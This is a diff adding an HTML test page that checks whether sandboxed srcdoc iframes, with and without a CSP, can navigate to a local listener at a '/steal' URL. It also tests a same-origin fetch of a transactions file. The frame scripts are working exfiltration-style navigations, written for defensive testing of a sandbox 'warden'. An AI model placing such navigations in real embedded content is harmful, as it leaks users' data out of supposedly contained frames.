@@ -1,0 +1,40 @@
+<!doctype html>
+<html><body style="font:13px system-ui">
+<h3 style="font:600 15px system-ui">Does a sandboxed srcdoc frame self-navigate?</h3>
+<p>Four frames try <code>location.href = "http://127.0.0.1:9999/steal?via=…"</code>.
+Start the listener first: <code>python3 demo/exfil-listener.py</code>. Whatever
+appears in its terminal navigated successfully; whatever doesn't, didn't.</p>
+<p style="background:#fff0f0;border:1px solid #e0b4b4;padding:.5rem .7rem;border-radius:6px"><b>Confirmed in a real browser: all four navigate.</b> The sandbox does not stop a frame leaving, and neither does the CSP. Only the <em>embedder's</em> <code>frame-src</code> does — which is what the warden supplies. <b>Headless Chrome reports the opposite and is wrong</b>; do not trust it here.</p>
+<div id="wrap"></div>
+<script>
+var INNER = '<!doctype html><html><head>HEADSLOT</head><body><p>FRAME</p>'
+  + '<scr' + 'ipt>'
+  + 'setTimeout(function(){ location.href = "http://127.0.0.1:9999/steal?via=VIA"; }, 400);'
+  + '</scr' + 'ipt></body></html>';
+
+var CSP = '<meta http-equiv="Content-Security-Policy" content="default-src &#39;none&#39;; script-src &#39;unsafe-inline&#39;">';
+
+function make(via, sandboxTokens, withCsp) {
+  var f = document.createElement("iframe");
+  if (sandboxTokens !== null) f.setAttribute("sandbox", sandboxTokens);
+  f.style.cssText = "width:100%;height:34px;border:1px solid #ccc;margin-bottom:4px";
+  f.srcdoc = INNER.replace("HEADSLOT", withCsp ? CSP : "").replace("VIA", via).replace("FRAME", via);
+  document.getElementById("wrap").appendChild(f);
+}
+
+make("sbx-csp",     "allow-scripts", true);
+// same-origin target: does the sandbox block ALL navigation, or only cross-origin?
+(function(){
+  var f = document.createElement("iframe");
+  f.setAttribute("sandbox", "allow-scripts");
+  f.style.cssText = "width:100%;height:34px;border:1px solid #090";
+  f.srcdoc = '<!doctype html><html><body><p>same-origin target</p><scr' + 'ipt>'
+    + 'setTimeout(function(){ location.href = "/demo/transactions.csv?via=sbx-same-origin"; }, 400);'
+    + '</scr' + 'ipt></body></html>';
+  document.getElementById("wrap").appendChild(f);
+})();
+make("sbx-nocsp",   "allow-scripts", false);
+make("nosbx-csp",   null,            true);
+make("nosbx-nocsp", null,            false);
+</script>
+</body></html>
